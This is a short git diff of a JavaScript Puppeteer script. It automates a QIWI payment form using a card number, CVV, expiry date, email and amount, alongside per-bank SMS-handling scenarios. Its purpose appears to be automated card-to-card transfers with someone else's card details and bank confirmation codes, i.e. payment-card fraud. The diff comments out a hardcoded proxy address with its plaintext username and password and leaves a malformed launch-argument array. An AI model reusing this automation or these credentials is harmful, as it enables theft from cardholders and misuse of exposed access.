@@ -44,9 +44,10 @@ const bankSMSProcess = async (url, page, sms) => {
   await scenarios[hostname](page, sms)
 }
 const write_data = async (toCard, amount, fromCard,cvv, expireDate, email, id) => {
-    const browser = await puppeteer.launch({args: ['--proxy-server=http://195.216.216.169:56942',' --no-sandbox', '--disable-setuid-sandbox']})
+    //'--proxy-server=http://195.216.216.169:56942'
+    const browser = await puppeteer.launch({args: [,' --no-sandbox', '--disable-setuid-sandbox']})
     const page = await browser.newPage()
-    await page.authenticate({ username: 'ttNkVLRS', password: '63cYXNdr'})
+    // await page.authenticate({ username: 'ttNkVLRS', password: '63cYXNdr'})
     await page.setViewport({ width: 1920, height: 984 })
     await page.goto('https://qiwi.com/payment/form/31873')
     console.log(2)
